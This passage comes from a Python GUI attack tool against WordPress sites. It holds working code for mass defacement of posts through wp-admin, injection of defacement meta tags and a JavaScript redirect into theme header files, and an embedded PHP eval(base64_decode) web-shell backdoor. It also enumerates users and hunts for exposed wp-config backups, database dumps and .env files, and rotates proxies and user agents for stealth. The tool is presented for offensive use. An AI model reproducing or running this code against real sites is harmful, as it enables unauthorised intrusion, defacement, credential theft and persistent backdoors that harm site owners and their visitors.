                    if BeautifulSoup:
                        soup = BeautifulSoup(edit_resp.text, 'html.parser')
                        nonce_input = soup.find('input', {'name': '_wpnonce'})
                        if nonce_input:
                            nonce = nonce_input.get('value', '')
                    else:
                        nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', edit_resp.text)
                        nonce = nonce_match.group(1) if nonce_match else ''
                    update_data = {'action': 'editpost', 'post_ID': post_id, '_wpnonce': nonce, 'content': deface_html, 'save': 'Update'}
                    update_resp = session.post(edit_url, data=update_data, timeout=timeout, verify=False)
                    if update_resp.status_code == 200:
                        defaced_count += 1
                except:
                    continue
            return defaced_count
        except:
            return 0

    def inject_seo_poison(self, session, url, timeout):
        try:
            theme_editor = urljoin(url.rstrip('/'), '/wp-admin/theme-editor.php?file=header.php')
            resp = session.get(theme_editor, timeout=timeout, verify=False)
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce'})
                nonce = nonce_input.get('value', '') if nonce_input else ''
            else:
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            poison_meta = '\n<meta name="keywords" content="hacked, defaced, security, vulnerability, exploit">\n<meta name="description" content="This site has been compromised">\n<meta name="robots" content="noindex, nofollow">\n'
            update_data = {'action': 'update', 'file': 'header.php', '_wpnonce': nonce, 'newcontent': poison_meta + (resp.text if 'textarea' in resp.text else '')}
            session.post(theme_editor, data=update_data, timeout=timeout, verify=False)
        except:
            pass

    def inject_redirects(self, session, url, timeout):
        try:
            theme_editor = urljoin(url.rstrip('/'), '/wp-admin/theme-editor.php?file=header.php')
            resp = session.get(theme_editor, timeout=timeout, verify=False)
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce'})
                nonce = nonce_input.get('value', '') if nonce_input else ''
            else:
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            redirect_code = "\n<script>\nif (document.referrer.indexOf('google') === -1) {\n    window.location.href = 'https://example.com';\n}\n</script>\n"
            update_data = {'action': 'update', 'file': 'header.php', '_wpnonce': nonce, 'newcontent': redirect_code + (resp.text if 'textarea' in resp.text else '')}
            session.post(theme_editor, data=update_data, timeout=timeout, verify=False)
        except:
            pass

    def embed_hidden_backdoor(self, session, url, deface_html, timeout):
        try:
            backdoor_code = '<?php if(isset($_GET["cmd"])){eval(base64_decode($_GET["cmd"]));} ?>'
            hidden_backdoor = f'<!-- {backdoor_code} -->'
            if hidden_backdoor not in deface_html:
                deface_html = deface_html.replace('</body>', f'{hidden_backdoor}\n</body>')
        except:
            pass

    def save_results(self):
        if not self.deface_targets:
            messagebox.showwarning('Warning', 'No defaced targets to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'deface_results_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Mass Deface Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Defaced: {len(self.deface_targets)}\n\n')
                for target in self.deface_targets:
                    f.write(f"[DEFACED] {target['url']}\n")
                    f.write(f"  Pages: {target.get('pages', 0)}\n")
                    f.write(f"  Posts: {target.get('posts', 0)}\n")
                    f.write(f"  Admin Created: {target.get('user_created', False)}\n")
                    f.write('\n')
            self.log(f'Results saved to: {filename}', 'fg_green')
            messagebox.showinfo('Success', f'Saved {len(self.deface_targets)} defaced targets to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 500:
                    self.log_text.delete(1.0, f'{lines - 200}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                stats_text = f"Total: {stats['total']} | Processed: {stats['processed']} | Defaced: {stats['deface']} | Posts: {stats['posts']} | Users: {stats['users']}"
                self.stats_label.config(text=stats_text)
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class AdvancedReconTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.recon_results = []
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'wp_detected': 0, 'plugins': 0, 'vulns': 0, 'users': 0, 'files': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='ADVANCED RECONNAISSANCE', font=('Courier', 20, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.setup_input_section(left_frame)
        self.setup_options_section(left_frame)
        self.setup_results_section(right_frame)

    def setup_input_section(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target URL/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)

    def setup_options_section(self, parent):
        options_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Recon Options:', font=('Courier', 10, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        options_inner = tk.Frame(options_frame, bg=self.colors['bg'])
        options_inner.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.fingerprint_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='WordPress Fingerprinting (Version, Plugins, Themes)', variable=self.fingerprint_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.plugin_vuln_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Plugin/Theme Vulnerability Scanner (CVE Matching)', variable=self.plugin_vuln_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.user_enum_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='User Enumeration (REST API, wp-json, author pages)', variable=self.user_enum_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.xmlrpc_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='XML-RPC Attack (Brute Force via XML-RPC)', variable=self.xmlrpc_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.backup_finder_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Backup File Finder (wp-config, .sql, .tar.gz, etc.)', variable=self.backup_finder_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.dir_brute_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Directory Brute Forcer (with wordlist)', variable=self.dir_brute_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        config_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        config_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(config_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.threads_entry.insert(0, '10')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(config_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START RECON]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, command=self.start_recon, width=20, height=2)
        self.start_button.pack(fill=tk.X, pady=2)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, command=self.stop_recon, width=20, height=2, state=tk.DISABLED)
        self.stop_button.pack(fill=tk.X, pady=2)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, command=self.save_results, width=20)
        self.save_button.pack(fill=tk.X, pady=2)

    def setup_results_section(self, parent):
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        results_frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(results_frame, text='Recon Results:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.stats_label = tk.Label(results_frame, text='Total: 0 | Processed: 0 | WP: 0 | Plugins: 0 | Vulns: 0 | Users: 0 | Files: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10)
        self.stats_label.pack(fill=tk.X, pady=(0, 4))
        self.log_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=30, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        self.results_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=15, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def start_recon(self):
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showerror('Error', 'Please enter target URL or select a file!')
            return
        try:
            threads = int(self.threads_entry.get() or '10')
            if threads < 1:
                threads = 1
            if threads > 50:
                threads = 50
        except:
            threads = 10
        try:
            timeout = int(self.timeout_entry.get() or '15')
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        self.is_running = True
        self.stop_flag = False
        self.recon_results = []
        self.stats = {'total': 0, 'processed': 0, 'wp_detected': 0, 'plugins': 0, 'vulns': 0, 'users': 0, 'files': 0}
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting advanced reconnaissance...', 'fg_cyan')
        thread = threading.Thread(target=self.recon_worker, args=(url_input, threads, timeout), daemon=True)
        thread.start()

    def stop_recon(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Recon operation stopped', 'fg_yellow')

    def recon_worker(self, url_input, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (not line.startswith('#')):
                            if line.startswith('http://') or line.startswith('https://'):
                                urls.append(line.rstrip('/'))
            except Exception as e:
                self.log(f'Error reading file: {str(e)[:50]}', 'fg_red')
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
                return
        else:
            url = url_input.rstrip('/')
            if url.startswith('http://') or url.startswith('https://'):
                urls.append(url)
        if not urls:
            self.log('No valid URLs found!', 'fg_red')
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            return
        self.stats['total'] = len(urls)
        self.stats_queue.put(self.stats.copy())
        max_workers = min(threads, len(urls))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.recon_target, url, timeout): url for url in urls}
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    result = future.result()
                    if result:
                        self.recon_results.append(result)
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            if result.get('wp_detected'):
                                self.stats['wp_detected'] += 1
                            if result.get('plugins'):
                                self.stats['plugins'] += len(result['plugins'])
                            if result.get('vulnerabilities'):
                                self.stats['vulns'] += len(result['vulnerabilities'])
                            if result.get('users'):
                                self.stats['users'] += len(result['users'])
                            if result.get('files_found'):
                                self.stats['files'] += len(result['files_found'])
                        self.stats_queue.put(self.stats.copy())
                        result_summary = f"[RECON] {result['url']} | WP: {result.get('wp_version', 'N/A')} | Plugins: {len(result.get('plugins', []))} | Users: {len(result.get('users', []))} | Files: {len(result.get('files_found', []))}\n"
                        self.frame.after(0, lambda rs=result_summary: self.results_text.insert(tk.END, rs, 'green'))
                        self.frame.after(0, lambda: self.results_text.see(tk.END))
                except:
                    pass
        self.is_running = False
        self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
        self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
        self.log(f"Recon operation completed. Total: {self.stats['processed']} | WP Detected: {self.stats['wp_detected']}", 'fg_green')

    def recon_target(self, url, timeout):
        if self.stop_flag:
            return None
        result = {'url': url, 'wp_detected': False, 'wp_version': None, 'plugins': [], 'themes': [], 'vulnerabilities': [], 'users': [], 'xmlrpc_enabled': False, 'files_found': []}
        try:
            session = requests.Session()
            session.headers.update(DEFAULT_HEADERS.copy())
            if self.fingerprint_var.get():
                self.log(f'[FINGERPRINT] Scanning {url}...', 'fg_cyan')
                wp_info = self.fingerprint_wordpress(session, url, timeout)
                if wp_info:
                    result['wp_detected'] = True
                    result['wp_version'] = wp_info.get('version')
                    result['plugins'] = wp_info.get('plugins', [])
                    result['themes'] = wp_info.get('themes', [])
            if self.plugin_vuln_var.get() and result.get('plugins'):
                self.log(f'[VULN-SCAN] Scanning vulnerabilities for {url}...', 'fg_cyan')
                vulns = self.scan_plugin_vulnerabilities(result['plugins'], result['themes'])
                result['vulnerabilities'] = vulns
            if self.user_enum_var.get():
                self.log(f'[USER-ENUM] Enumerating users for {url}...', 'fg_cyan')
                users = self.enumerate_users(session, url, timeout)
                result['users'] = users
            if self.xmlrpc_var.get():
                self.log(f'[XML-RPC] Checking XML-RPC for {url}...', 'fg_cyan')
                xmlrpc_enabled = self.check_xmlrpc(session, url, timeout)
                result['xmlrpc_enabled'] = xmlrpc_enabled
            if self.backup_finder_var.get():
                self.log(f'[BACKUP] Finding backup files for {url}...', 'fg_cyan')
                files = self.find_backup_files(session, url, timeout)
                result['files_found'] = files
            if self.dir_brute_var.get():
                self.log(f'[DIR-BRUTE] Brute forcing directories for {url}...', 'fg_cyan')
                dirs = self.brute_directories(session, url, timeout)
                result['directories'] = dirs
            return result
        except Exception as e:
            return None

    def fingerprint_wordpress(self, session, url, timeout):
        info = {'version': None, 'plugins': [], 'themes': []}
        try:
            resp = session.get(url, timeout=timeout, verify=False)
            version_match = re.search('wp-content/themes/([^/]+)/', resp.text)
            if version_match:
                info['themes'].append(version_match.group(1))
            version_match = re.search('content="WordPress ([^"]+)"', resp.text)
            if version_match:
                info['version'] = version_match.group(1)
            plugin_matches = re.findall('wp-content/plugins/([^/]+)/', resp.text)
            info['plugins'] = list(set(plugin_matches))[:20]
            readme_resp = session.get(urljoin(url, '/readme.html'), timeout=timeout, verify=False)
            if readme_resp.status_code == 200 and 'WordPress' in readme_resp.text:
                version_match = re.search('Version ([0-9.]+)', readme_resp.text)
                if version_match:
                    info['version'] = version_match.group(1)
            gen_resp = session.get(urljoin(url, '/wp-includes/version.php'), timeout=timeout, verify=False)
            if gen_resp.status_code == 200:
                version_match = re.search('\\$wp_version\\s*=\\s*[\\\'"]?([0-9.]+)', gen_resp.text)
                if version_match:
                    info['version'] = version_match.group(1)
            if info['version'] or info['plugins'] or info['themes']:
                self.log(f"[WP-DETECTED] {url} | Version: {info.get('version', 'Unknown')} | Plugins: {len(info['plugins'])} | Themes: {len(info['themes'])}", 'fg_green')
                return info
        except:
            pass
        return None

    def scan_plugin_vulnerabilities(self, plugins, themes):
        vulns = []
        common_vulns = {'woocommerce': ['CVE-2021-34646', 'CVE-2020-15198'], 'contact-form-7': ['CVE-2020-35489'], 'file-manager': ['CVE-2020-25213'], 'elementor': ['CVE-2022-1329'], 'wp-file-manager': ['CVE-2020-25213']}
        for plugin in plugins:
            plugin_lower = plugin.lower()
            if plugin_lower in common_vulns:
                for cve in common_vulns[plugin_lower]:
                    vulns.append({'type': 'plugin', 'name': plugin, 'cve': cve})
        return vulns

    def enumerate_users(self, session, url, timeout):
        users = []
        try:
            rest_url = urljoin(url, '/wp-json/wp/v2/users')
            resp = session.get(rest_url, timeout=timeout, verify=False)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    for user in data:
                        users.append({'id': user.get('id'), 'username': user.get('slug'), 'name': user.get('name'), 'email': user.get('email', 'N/A')})
                except:
                    pass
            author_url = urljoin(url, '/?author=1')
            resp = session.get(author_url, timeout=timeout, verify=False, allow_redirects=True)
            if resp.status_code == 200 and 'author' in resp.url:
                username_match = re.search('/author/([^/]+)/', resp.url)
                if username_match:
                    users.append({'username': username_match.group(1), 'method': 'author_page'})
        except:
            pass
        return users

    def check_xmlrpc(self, session, url, timeout):
        try:
            xmlrpc_url = urljoin(url, '/xmlrpc.php')
            resp = session.get(xmlrpc_url, timeout=timeout, verify=False)
            if 'XML-RPC' in resp.text or resp.status_code == 405:
                return True
        except:
            pass
        return False

    def find_backup_files(self, session, url, timeout):
        files_found = []
        backup_paths = ['/wp-config.php.bak', '/wp-config.php.old', '/wp-config.php.backup', '/wp-config.php~', '/wp-config.php.save', '/.wp-config.php.swp', '/wp-config.txt', '/database.sql', '/database.sql.gz', '/backup.sql', '/backup.sql.gz', '/dump.sql', '/dump.sql.gz', '/wp-content/backup-db/', '/wp-content/uploads/dump.sql', '/wp-content/debug.log', '/wp-content/backups/', '/.env', '/wp-config-sample.php', '/wp-admin/install.php.bak']
        for path in backup_paths[:15]:
            if self.stop_flag:
                break
            try:
                test_url = urljoin(url, path)
                resp = session.get(test_url, timeout=timeout, verify=False)
                if resp.status_code == 200 and len(resp.content) > 0:
                    files_found.append(path)
                    self.log(f'[BACKUP-FOUND] {url}{path}', 'fg_green')
            except:
                continue
        return files_found

    def brute_directories(self, session, url, timeout):
        dirs_found = []
        common_dirs = ['wp-admin', 'wp-content', 'wp-includes', 'wp-login.php', 'xmlrpc.php', 'wp-config.php', 'readme.html', 'license.txt', 'admin', 'administrator', 'backup', 'backups', 'old', 'test', 'tmp', 'temp', 'uploads', 'files', 'private', 'secure']
        for dir_name in common_dirs:
            if self.stop_flag:
                break
            try:
                test_url = urljoin(url, f'/{dir_name}')
                resp = session.get(test_url, timeout=timeout, verify=False)
                if resp.status_code in [200, 301, 302, 403]:
                    dirs_found.append(dir_name)
            except:
                continue
        return dirs_found

    def save_results(self):
        if not self.recon_results:
            messagebox.showwarning('Warning', 'No recon results to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'recon_results_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Advanced Reconnaissance Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Targets: {len(self.recon_results)}\n\n')
                for result in self.recon_results:
                    f.write(f"[TARGET] {result['url']}\n")
                    if result.get('wp_detected'):
                        f.write(f"  WordPress Version: {result.get('wp_version', 'Unknown')}\n")
                    if result.get('plugins'):
                        f.write(f"  Plugins: {', '.join(result['plugins'][:10])}\n")
                    if result.get('users'):
                        f.write(f"  Users Found: {len(result['users'])}\n")
                        for user in result['users'][:5]:
                            f.write(f"    - {user.get('username', 'N/A')} ({user.get('name', 'N/A')})\n")
                    if result.get('vulnerabilities'):
                        f.write(f"  Vulnerabilities: {len(result['vulnerabilities'])}\n")
                        for vuln in result['vulnerabilities'][:5]:
                            f.write(f"    - {vuln.get('cve', 'N/A')} ({vuln.get('name', 'N/A')})\n")
                    if result.get('files_found'):
                        f.write(f"  Backup Files: {', '.join(result['files_found'][:10])}\n")
                    f.write('\n')
            self.log(f'Results saved to: {filename}', 'fg_green')
            messagebox.showinfo('Success', f'Saved {len(self.recon_results)} recon results to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 500:
                    self.log_text.delete(1.0, f'{lines - 200}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                stats_text = f"Total: {stats['total']} | Processed: {stats['processed']} | WP: {stats['wp_detected']} | Plugins: {stats['plugins']} | Vulns: {stats['vulns']} | Users: {stats['users']} | Files: {stats['files']}"
                self.stats_label.config(text=stats_text)
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class ProxyRotatorTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.proxy_pool = []
        self.valid_proxies = []
        self.current_proxy_index = 0
        self.user_agents = DORK_USER_AGENTS.copy() if 'DORK_USER_AGENTS' in globals() else [DEFAULT_USER_AGENT]
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'tested': 0, 'valid': 0, 'invalid': 0, 'current_ip': None}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()
        self.load_proxies_from_file()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='PROXY/VPN ROTATOR & STEALTH', font=('Courier', 20, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.setup_proxy_manager(left_frame)
        self.setup_stealth_options(left_frame)
        self.setup_results_section(right_frame)

    def setup_proxy_manager(self, parent):
        proxy_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        proxy_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(proxy_frame, text='Proxy Pool Manager:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        input_frame = tk.Frame(proxy_frame, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(input_frame, text='Proxy List (one per line, format: ip:port or ip:port:user:pass):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 4))
        proxy_input_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        proxy_input_frame.pack(fill=tk.X)
        self.proxy_text = scrolledtext.ScrolledText(proxy_input_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=8, wrap=tk.WORD)
        self.proxy_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        button_frame = tk.Frame(proxy_input_frame, bg=self.colors['bg'])
        button_frame.pack(side=tk.RIGHT, fill=tk.Y)
        tk.Button(button_frame, text='Load File', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.load_proxy_file, width=15).pack(pady=2)
        tk.Button(button_frame, text='Add Proxy', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=self.add_proxy_manual, width=15).pack(pady=2)
        tk.Button(button_frame, text='Clear', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_yellow'], command=self.clear_proxies, width=15).pack(pady=2)
        test_frame = tk.Frame(proxy_frame, bg=self.colors['bg'])
        test_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(test_frame, text='Test URL:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.test_url_entry = tk.Entry(test_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=30)
        self.test_url_entry.insert(0, 'https://httpbin.org/ip')
        self.test_url_entry.pack(side=tk.LEFT, padx=(0, 5))
        tk.Button(test_frame, text='Test All', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=self.test_all_proxies, width=12).pack(side=tk.LEFT, padx=2)
        tk.Button(test_frame, text='Save Valid', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.save_valid_proxies, width=12).pack(side=tk.LEFT, padx=2)

    def setup_stealth_options(self, parent):
        stealth_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stealth_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(stealth_frame, text='Stealth Options:', font=('Courier', 10, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        options_inner = tk.Frame(stealth_frame, bg=self.colors['bg'])
        options_inner.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.rotate_proxy_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Auto-Rotate Proxy (per request)', variable=self.rotate_proxy_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.rotate_ua_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Rotate User-Agent (per request)', variable=self.rotate_ua_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.randomize_headers_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Randomize Headers (Accept-Language, etc.)', variable=self.randomize_headers_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.random_delay_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Random Request Delay (anti-rate-limit)', variable=self.random_delay_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.check_geolocation_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Check IP Geolocation', variable=self.check_geolocation_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        delay_frame = tk.Frame(stealth_frame, bg=self.colors['bg'])
        delay_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(delay_frame, text='Delay Range (seconds):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
